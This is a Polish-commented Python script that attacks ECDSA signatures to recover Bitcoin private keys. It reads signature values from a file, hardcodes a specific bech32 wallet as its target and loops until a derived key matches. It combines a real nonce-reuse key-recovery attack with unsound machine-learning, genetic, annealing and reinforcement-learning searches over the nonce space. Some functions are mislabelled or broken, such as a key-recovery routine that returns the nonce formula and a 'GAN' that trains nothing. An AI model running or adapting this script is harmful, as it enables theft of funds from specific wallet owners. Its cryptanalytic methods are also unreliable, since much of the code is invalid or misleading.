#!/usr/bin/env python3
import requests
import time
import random
import json
from binascii import unhexlify
import hashlib
import asn1
import os
import logging
import math
import copy
import numpy as np
import xgboost as xgb
from deap import base, creator, tools, algorithms
from sympy import symbols, Eq, solve
from functools import lru_cache
from multiprocessing import freeze_support, Pool
import pandas as pd
import warnings
import tensorflow as tf
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import LSTM, Dense
from tensorflow.keras.optimizers import Adam
import gym
from gym import spaces
import base58
import bech32
import ecdsa
from ecdsa.numbertheory import inverse_mod
from ecdsa.ecdsa import generator_secp256k1
import gc
import re  # Dodany import do parsowania pliku

warnings.filterwarnings("ignore")

# Ustawienia logowania – zapisywanie wyników do pliku
logging.basicConfig(filename="optimization.log", level=logging.INFO,
                    format="%(asctime)s - %(levelname)s - %(message)s")

# Parametry ECDSA
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# ----------------------------------------------------------------------------
# Funkcja pomocnicza do dekodowania adresu (do porównania)
def get_hash160_from_address(addr):
    try:
        if addr.startswith("1") or addr.startswith("3"):  # P2PKH lub P2SH
            decoded = base58.b58decode_check(addr)
            return decoded[1:].hex()
        elif addr.startswith("bc1"):  # Bech32 (SegWit)
            hrp, data = bech32.bech32_decode(addr)
            if data is None:
                return None
            converted = bech32.convertbits(data[1:], 5, 8, False)
            return bytes(converted).hex()
    except Exception as e:
        print(f"Błąd dekodowania adresu: {e}", flush=True)
        return None

# ----------------------------------------------------------------------------
# Funkcja wczytująca transakcje z pliku
def read_transactions_from_file(file_path):
    transactions = []
    try:
        with open(file_path, "r") as f:
            content = f.read()
        # Podział na bloki – zakładamy, że transakcje oddzielone są linią "----------------------------------"
        blocks = content.split("----------------------------------")
        for block in blocks:
            # Szukamy wszystkich wystąpień par: rX, sX, zX
            matches = re.findall(r"r\d+:\s*([0-9a-fA-F]+).*?s\d+:\s*([0-9a-fA-F]+).*?z\d+:\s*([0-9a-fA-F]+)", block, re.DOTALL)
            for m in matches:
                try:
                    tx = {
                        "r": int(m[0], 16),
                        "s": int(m[1], 16),
                        "z": int(m[2], 16)
                    }
                    transactions.append(tx)
                except Exception as e:
                    logging.error("Błąd konwersji transakcji: %s", e)
                    continue
        logging.info("Wczytano %d transakcji z pliku %s", len(transactions), file_path)
    except Exception as e:
        logging.error("Błąd wczytywania transakcji z pliku: %s", e)
    return transactions

# ----------------------------------------------------------------------------
# Funkcja zwracająca zestaw transakcji – transakcje są teraz wczytywane z pliku "vulnerabilities.txt"
def get_real_transactions():
    file_path = "vulnerabilities.txt"
    return read_transactions_from_file(file_path)

# ----------------------------------------------------------------------------
# Funkcja odzyskująca d (cache'owana) – ograniczony cache do 1000 wyników
@lru_cache(maxsize=1000)
def recover_d_cached(r, s, z, k):
    try:
        inv_r = inverse_mod(r, n)
    except Exception:
        return None
    d = ((s * k - z) % n) * inv_r % n
    if 1 < d < n:
        return d
    return None

# ----------------------------------------------------------------------------
# Funkcja celu – oblicza wariancję odzyskanych d
def objective(k):
    k_int = int(k % n)
    transactions = get_real_transactions()
    candidate_ds = []
    for tx in transactions:
        d_candidate = recover_d_cached(tx["r"], tx["s"], tx["z"], k_int)
        if d_candidate is None:
            candidate_ds.append(n)  # kara – wartość wysoka, gdy odzyskanie się nie udało
        else:
            candidate_ds.append(d_candidate)
    error = 0
    for i in range(len(candidate_ds)):
        for j in range(i+1, len(candidate_ds)):
            error += abs(candidate_ds[i] - candidate_ds[j])
    return error, candidate_ds

# ----------------------------------------------------------------------------
# Funkcja ekstrakcji cech – opcjonalnie z redukcją wymiarowości przez PCA
def extract_features(signatures, use_pca=False):
    features = []
    for i, sig in enumerate(signatures):
        r_norm = sig["r"] / n
        s_norm = sig["s"] / n
        z_norm = sig["z"] / n
        log_r = math.log(sig["r"] + 1)
        log_s = math.log(sig["s"] + 1)
        log_z = math.log(sig["z"] + 1)
        if i > 0:
            dr = abs(sig["r"] - signatures[i-1]["r"]) / n
            ds = abs(sig["s"] - signatures[i-1]["s"]) / n
            dz = abs(sig["z"] - signatures[i-1]["z"]) / n
        else:
            dr = ds = dz = 0
        features.append([r_norm, s_norm, z_norm, log_r, log_s, log_z, dr, ds, dz])
    features = np.array(features, dtype=float)
    # Opcjonalnie: redukcja wymiarowości przy użyciu PCA
    if use_pca:
        from sklearn.decomposition import PCA
        pca = PCA(n_components=5)
        features = pca.fit_transform(features)
    return features

# ----------------------------------------------------------------------------
# Trenowanie modelu ML – zamiast losowych targetów wykorzystamy candidate_k
def train_ml_model(signatures, use_pca=False):
    X = extract_features(signatures, use_pca=use_pca)
    # Szybkie wyliczenie k przy użyciu algorytmu genetycznego (krótsze parametry dla szybkości)
    candidate_k = genetic_algorithm_k(signatures, generations=10, population_size=5)
    # Używamy candidate_k jako "prawdziwego" targetu (normalizujemy)
    y = np.array([candidate_k / n for _ in signatures], dtype=float)
    # Możesz tutaj użyć GridSearchCV dla optymalizacji modelu
    model = xgb.XGBRegressor(objective="reg:squarederror", n_estimators=100)
    model.fit(X, y)
    return model

def predict_k_with_ml(model, signatures, use_pca=False):
    X = extract_features(signatures, use_pca=use_pca)
    predicted = model.predict(X)
    # Przekształcamy wynik do zakresu [1, n-1]
    predicted_k = [max(1, min(n-1, int(round(p * n)))) for p in predicted]
    return predicted_k

# ----------------------------------------------------------------------------
# Algorytm genetyczny – minimalizuje funkcję celu
creator.create("FitnessMin", base.Fitness, weights=(-1.0,))
creator.create("Individual", list, fitness=creator.FitnessMin)

def eval_k(individual):
    k = individual[0]
    err, ds = objective(k)
    logging.info(f"Kandydat k: {k} | Błąd: {err} | d: {ds}")
    return (err,)

def genetic_algorithm_k(signatures, generations=150, population_size=30):
    toolbox = base.Toolbox()
    toolbox.register("attr_int", random.randint, 1, n-1)
    toolbox.register("individual", tools.initRepeat, creator.Individual, toolbox.attr_int, 1)
    toolbox.register("population", tools.initRepeat, list, toolbox.individual)
    toolbox.register("evaluate", eval_k)
    toolbox.register("mate", tools.cxUniform, indpb=0.5)
    toolbox.register("mutate", tools.mutGaussian, mu=0, sigma=n//1000, indpb=0.2)
    toolbox.register("select", tools.selTournament, tournsize=3)
    pop = toolbox.population(n=population_size)
    algorithms.eaSimple(pop, toolbox, cxpb=0.5, mutpb=0.2, ngen=generations, verbose=True)
    best_ind = tools.selBest(pop, 1)[0][0]
    logging.info(f"Najlepsze k znalezione przez algorytm genetyczny: {best_ind}")
    return best_ind

# ----------------------------------------------------------------------------
# Simulated annealing – lokalne przeszukiwanie otoczenia k
def simulated_annealing_k(initial_k, T_init=15000, alpha=0.995, iterations=1000):
    current_k = initial_k
    current_error, _ = objective(current_k)
    best_k = current_k
    best_error = current_error
    T = T_init
    for i in range(iterations):
        delta = random.randint(-int(T), int(T))
        new_k = (current_k + delta) % n
        new_error, _ = objective(new_k)
        if new_error < current_error:
            current_k, current_error = new_k, new_error
            if new_error < best_error:
                best_k, best_error = new_k, new_error
        else:
            if random.random() < math.exp(-(new_error - current_error) / T):
                current_k, current_error = new_k, new_error
        T = max(1, T * alpha)
    logging.info(f"Simulated annealing: najlepsze k = {best_k} z błędem {best_error}")
    return best_k

# ----------------------------------------------------------------------------
# Brute-force refinement – lokalne przeszukiwanie otoczenia k
def refine_candidate_k(candidate_k, search_range=1000):
    best_k = candidate_k
    best_error, _ = objective(candidate_k)
    for delta in range(-search_range, search_range + 1):
        new_k = (candidate_k + delta) % n
        error, _ = objective(new_k)
        if error < best_error:
            best_error = error
            best_k = new_k
    logging.info(f"Refinement: ulepszone k = {best_k} z błędem {best_error}")
    return best_k

# ----------------------------------------------------------------------------
# Funkcja do wykrywania liniowej zależności nonce na podstawie pary transakcji
def compute_linear_nonce(tx1, tx2, r_threshold=1000):
    """
    Jeśli różnica między r w dwóch transakcjach jest niewielka, spróbuj obliczyć k.
    Wzór: k = (z1 - z2) * inverse_mod(s1 - s2, n) mod n
    """
    if abs(tx1["r"] - tx2["r"]) >= r_threshold:
        return None
    s_diff = (tx1["s"] - tx2["s"]) % n
    if s_diff == 0:
        return None
    z_diff = (tx1["z"] - tx2["z"]) % n
    candidate_k = (z_diff * inverse_mod(s_diff, n)) % n
    print(f"✅ Wykryto liniową zależność k z pary transakcji: k = {hex(candidate_k)}", flush=True)
    return candidate_k

# ----------------------------------------------------------------------------
# Funkcja generująca adresy z odzyskanego klucza prywatnego
def generate_addresses_from_private_key(d):
    try:
        private_key_bytes = d.to_bytes(32, 'big')
        sk = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
        pubkey_compressed = sk.get_verifying_key().to_string("compressed")
        pubkey_hash = hashlib.new('ripemd160', hashlib.sha256(pubkey_compressed).digest()).digest()
        p2pkh_address = base58.b58encode_check(b'\x00' + pubkey_hash).decode()
        bech32_address = bech32.encode("bc", 0, pubkey_hash)
        nested_script = b'\x00\x14' + pubkey_hash
        nested_hash = hashlib.new('ripemd160', hashlib.sha256(nested_script).digest()).digest()
        nested_p2sh = base58.b58encode_check(b'\x05' + nested_hash).decode()
        return p2pkh_address, bech32_address, nested_p2sh
    except Exception as e:
        print(f"Błąd generowania adresów: {e}", flush=True)
        return None, None, None

# ----------------------------------------------------------------------------
# Dodatkowe funkcje odzyskiwania klucza (opcjonalnie)
def recover_keys_from_two(tx1, tx2):
    if tx1["r"] != tx2["r"]:
        raise ValueError("Transakcje mają różne r, nie można zastosować reuse k attack!")
    diff_s = (tx1["s"] - tx2["s"]) % n
    inv_diff_s = inverse_mod(diff_s, n)
    k = ((tx1["z"] - tx2["z"]) % n) * inv_diff_s % n
    inv_r = inverse_mod(tx1["r"], n)
    d = ((tx1["s"] * k - tx1["z"]) % n) * inv_r % n
    return k, d

def recover_private_key(signatures):
    reused_k_indices = find_reused_k(signatures)
    for indices in reused_k_indices:
        sig1, sig2 = signatures[indices[0]], signatures[indices[1]]
        z1, z2 = sig1["z"], sig2["z"]
        s1, s2 = sig1["s"], sig2["s"]
        r = sig1["r"]
        if (s1 - s2) % n != 0:
            d = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
            return hex(d)
    return None

def find_reused_k(signatures):
    from collections import defaultdict
    r_values = defaultdict(list)
    for i, sig in enumerate(signatures):
        r_values[sig["r"]].append(i)
    reused_k = [indices for indices in r_values.values() if len(indices) > 1]
    return reused_k

def detect_low_s(signatures):
    low_s = []
    for i, sig in enumerate(signatures):
        if sig["s"] < n // 2:
            low_s.append(i)
    return low_s

def detect_linear_k(signatures):
    equations = []
    k_symbols = symbols(f'k0:{len(signatures)}')
    for i, sig in enumerate(signatures):
        eq = Eq(sig["s"] * k_symbols[i] - sig["z"], 0)
        equations.append(eq)
    solution = solve(equations, k_symbols)
    return solution if solution else None

# ----------------------------------------------------------------------------
# NIestandardowe ŚRODOWISKO GYM DLA RL
class ECDSAEnv(gym.Env):
    metadata = {'render.modes': ['human']}
    def __init__(self, k_init):
        super(ECDSAEnv, self).__init__()
        self.k = float(k_init % n)
        self.observation_space = spaces.Box(low=0.0, high=1.0, shape=(1,), dtype=np.float64)
        self.action_space = spaces.Discrete(201)
    def step(self, action):
        delta = action - 100
        self.k = (self.k + delta) % n
        err, ds = objective(self.k)
        reward = -min(err, 100.0) if not (math.isnan(err) or math.isinf(err)) else -100.0
        done = False
        info = {"error": err}
        return np.array([self.k / n], dtype=np.float64), reward, done, info
    def reset(self):
        self.k = 0.0
        return np.array([self.k / n], dtype=np.float64)
    def render(self, mode="human"):
        print("Aktualny k:", self.k, flush=True)

# ----------------------------------------------------------------------------
# Funkcje szkolenia GAN + LSTM (opcjonalne)
def train_lstm():
    transactions_local = get_real_transactions()
    nonce_values = [tx["z"] / tx["s"] for tx in transactions_local]
    data = np.array(nonce_values).reshape(-1, 1)
    data = np.repeat(data, 10, axis=1)
    data = data.reshape((data.shape[0], data.shape[1], 1))
    model = Sequential([
        tf.keras.layers.LSTM(32, input_shape=(data.shape[1], 1), return_sequences=True),
        tf.keras.layers.LSTM(16),
        tf.keras.layers.Dense(1, activation='linear')
    ])
    model.compile(optimizer=Adam(), loss='mse')
    model.fit(data, data[:, -1, :], epochs=5, verbose=1)
    try:
        RESULTS_FILES = {"nonce_data": os.path.join("method_results", "nonce_data.csv")}
        np.savetxt(RESULTS_FILES["nonce_data"], data.reshape(data.shape[0], data.shape[1]), delimiter=",")
    except Exception as e:
        print("Błąd zapisu danych nonce:", e, flush=True)
    return model

def train_gan():
    train_lstm()
    RESULTS_FILES = {"gan": os.path.join("method_results", "gan_results.txt")}
    with open(RESULTS_FILES["gan"], "w") as f:
        f.write("Trening GAN zakończony – wygenerowano nonce\n")

# ----------------------------------------------------------------------------
# Funkcja ataków AI-supervised (opcjonalna)
def ai_supervised_attacks():
    RESULTS_FILES = {"all_methods": os.path.join("method_results", "all_results.csv"),
                     "analysis": os.path.join("method_results", "analysis.json")}
    if not os.path.exists(RESULTS_FILES["all_methods"]):
        print("Plik all_results.csv nie istnieje. Tworzę domyślne dane.", flush=True)
        default_df = pd.DataFrame({
            'iteration': range(10),
            'k': [random.randint(0, n) for _ in range(10)],
            'error': [random.uniform(0, 10) for _ in range(10)],
            'success': [random.randint(0, 1) for _ in range(10)]
        })
        default_df.to_csv(RESULTS_FILES["all_methods"], sep=";", index=False)
        print("Utworzono domyślny plik all_results.csv.", flush=True)
    try:
        df = pd.read_csv(RESULTS_FILES["all_methods"], sep=";", encoding='utf-8', engine="python")
    except (UnicodeDecodeError, pd.errors.ParserError):
        try:
            df = pd.read_csv(RESULTS_FILES["all_methods"], sep=";", encoding='latin1', engine="python")
        except Exception as e:
            print(f"Błąd przy odczycie pliku CSV: {e}", flush=True)
            return
    if "success" not in df.columns:
        print("Brak kolumny 'success' w danych, pomijam uczenie.", flush=True)
        return
    X = df.drop("success", axis=1)
    y = df["success"]
    model = xgb.XGBClassifier()
    model.fit(X, y)
    preds = model.predict(X)
    with open(RESULTS_FILES["analysis"], "w") as f:
        json.dump({"Hybrid": float(np.mean(preds))}, f)

# ----------------------------------------------------------------------------
# Funkcja pomocnicza do równoległej ewaluacji k
def evaluate_candidate(k):
    error, ds = objective(k)
    return (k, error, ds)

# ----------------------------------------------------------------------------
# Mechanizm iteracyjnej poprawy – wyszukiwanie k aż do znalezienia poprawnej pary (d, k)
def iterative_search(target_address, max_iterations=2000000000, use_pca=False):
    signatures = get_real_transactions()
    target_hash160 = get_hash160_from_address(target_address)
    iteration = 0
    best_overall_ds = None
    best_overall_error = float('inf')
    best_overall_k = None

    # Pętla iteracyjna – działa dopóki nie zostanie znaleziony kandydat odpowiadający target_address
    while iteration < max_iterations:
        print(f"\nIteracja {iteration}: generowanie kandydatów...", flush=True)
        
        # Trenowanie modelu ML, predykcja k i zwolnienie pamięci
        model_ml = train_ml_model(signatures, use_pca=use_pca)
        predicted_ks_ml = predict_k_with_ml(model_ml, signatures, use_pca=use_pca)
        del model_ml
        gc.collect()

        candidate_k_genetic = genetic_algorithm_k(signatures, generations=50, population_size=10)
        candidate_ks = set(predicted_ks_ml + [candidate_k_genetic])
        
        # Dodanie k wyliczonego metodą liniową dla każdej pary transakcji
        for i in range(len(signatures)):
            for j in range(i+1, len(signatures)):
                candidate_k_linear = compute_linear_nonce(signatures[i], signatures[j], r_threshold=1000)
                if candidate_k_linear is not None:
                    candidate_ks.add(candidate_k_linear)
        
        print(f"Iteracja {iteration}: znaleziono {len(candidate_ks)} kandydatów k", flush=True)
        
        # Adaptacyjne zawężanie zakresu wyszukiwania – im lepszy wynik, tym mniejszy zakres refinementu
        if best_overall_error < 100 and best_overall_k is not None:
            search_range = 100 if best_overall_error >= 10 else 50
            print("🔥 Niski błąd – uruchamiam intensywny refinement.", flush=True)
            candidate_k_bruteforce = refine_candidate_k(best_overall_k, search_range=search_range)
            candidate_ks.add(candidate_k_bruteforce)
        
        # Dodatkowo stosujemy refinement i simulated annealing dla najlepszego k (jeśli już znaleziono dobry kandydat)
        if best_overall_k is not None:
            refined_k = refine_candidate_k(best_overall_k, search_range=5000)
            candidate_ks.add(refined_k)
            annealed_k = simulated_annealing_k(best_overall_k, T_init=15000, alpha=0.995, iterations=1000)
            candidate_ks.add(annealed_k)
        
        # Równoległa ocena wszystkich kandydatów k
        with Pool() as pool:
            results = pool.map(evaluate_candidate, list(candidate_ks))
        
        for k, error, ds in results:
            print(f"Spróbowano k: {k} | błąd: {error}", flush=True)
            if error < best_overall_error:
                best_overall_error = error
                best_overall_k = k
                best_overall_ds = ds
                logging.info(f"Iteracja {iteration}: nowy najlepszy k: {k} z błędem {error}")
            for d in ds:
                p2pkh, bc1, p2sh = generate_addresses_from_private_key(d)
                print(f"Spróbowano k: {k} | d: {d}", flush=True)
                print(f"Adres P2PKH: {p2pkh}", flush=True)
                print(f"Adres Bech32: {bc1}", flush=True)
                print(f"Adres P2SH: {p2sh}", flush=True)
                if target_address in (p2pkh, bc1, p2sh):
                    print("🎉 ZNALEZIONO POPRAWNY KLUCZ!", flush=True)
                    print(f"🔑 Klucz prywatny: {d}", flush=True)
                    print(f"🔑 Kandydat k: {k}", flush=True)
                    return d, k
        
        iteration += 1
        print(f"Iteracja {iteration}: najlepszy dotychczasowy błąd {best_overall_error} dla k {best_overall_k}", flush=True)
        gc.collect()  # Ręczne wywołanie garbage collection po każdej iteracji
        
    if best_overall_ds:
        print("Końcowy najlepszy kandydat:", flush=True)
        print(f"k: {best_overall_k} | błąd: {best_overall_error} | d: {best_overall_ds}", flush=True)
        return best_overall_ds[0], best_overall_k
    return None, None

# ----------------------------------------------------------------------------
# Główna pętla – skrypt kończy się dopóki nie zostanie znaleziony poprawny klucz
def main():
    freeze_support()
    target_address = "bc1qm34lsc65zpw79lxes69zkqmk6ee3ewf0j77s3h"
    print("==== Rozpoczynam analizę ataków na ECDSA ====", flush=True)
    
    # Test generowania adresów z przykładowego klucza (d_test)
    d_test = 0x1  # Przykładowy klucz – zmień, jeśli chcesz testować
    p2pkh_test, bc1_test, p2sh_test = generate_addresses_from_private_key(d_test)
    print("Test generowania adresów:", flush=True)
    print("Adres P2PKH:", p2pkh_test, flush=True)
    print("Adres Bech32:", bc1_test, flush=True)
    print("Adres P2SH:", p2sh_test, flush=True)
    
    # Opcjonalnie można ustawić use_pca=True przy treningu modelu ML
    d_found, k_found = iterative_search(target_address, max_iterations=2000000000, use_pca=False)
    if d_found is not None:
        print(f"🔑 Odzyskany klucz prywatny: {d_found}", flush=True)
        print(f"🔑 Kandydat k: {k_found}", flush=True)
    else:
        print("❌ Nie udało się odzyskać klucza prywatnego.", flush=True)

if __name__ == '__main__':
    main()
